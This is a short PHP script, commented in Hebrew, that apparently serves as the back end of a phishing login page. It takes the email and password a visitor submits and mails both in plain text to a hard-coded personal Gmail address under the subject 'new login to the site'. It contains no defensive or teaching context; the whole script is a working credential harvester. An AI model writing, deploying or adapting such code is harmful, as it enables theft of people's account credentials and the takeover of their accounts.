<?php
// מקבל את הנתונים מה-HTML
$data = json_decode(file_get_contents('php://input'), true);
$email = $data['email'];
$password = $data['password'];

// כתובת ה-Gmail שלך
$to = "ITAITUSHBOX@gmail.com";
$subject = "🟢 התחברות חדשה לאתר";
$message = "📧 אימייל: $email\n🔑 סיסמה: $password";

// כותרות מייל
$headers = "From: noreply@yourdomain.com\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

// שולח את המייל
$mail_sent = mail($to, $subject, $message, $headers);

// מחזיר תשובה ל-HTML
if ($mail_sent) {
    echo json_encode(["status" => "success"]);
} else {
    echo json_encode(["status" => "fail"]);
}
?>
